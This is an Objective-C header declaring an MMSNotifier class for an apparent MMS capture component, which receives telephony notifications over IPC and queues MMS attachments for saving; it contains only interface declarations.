//
//  MMSNotifier.h
//  MMSCaptureManager
//
//  Created by Makara Khloth on 2/6/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import <Foundation/Foundation.h>

#import "MessagePortIPCReader.h"

@protocol TelephonyNotificationManager;

@interface MMSNotifier : NSObject <MessagePortIPCDelegate> {
@private
	id <TelephonyNotificationManager>	mTelephonyNotificationManager;
	MessagePortIPCReader				*mMessagePortReader;
	
	id	mDelegate;
	SEL mEventsSelector;
	SEL	mEventSelector;
	
	NSString			*mMMSAttachmentPath;
	NSMutableArray		*mMMSInfoArray;
	NSOperationQueue	*mAttSavingQueue;
}

@property (nonatomic, copy) NSString *mMMSAttachmentPath;
@property (nonatomic, assign) id mDelegate;
@property (nonatomic, assign) SEL mEventsSelector;
@property (nonatomic, assign) SEL mEventSelector;

- (id) initWithTelephonyNotificationManager: (id <TelephonyNotificationManager>) aTelephonyNotificationManager;

- (void) start;
- (void) stop;

@end
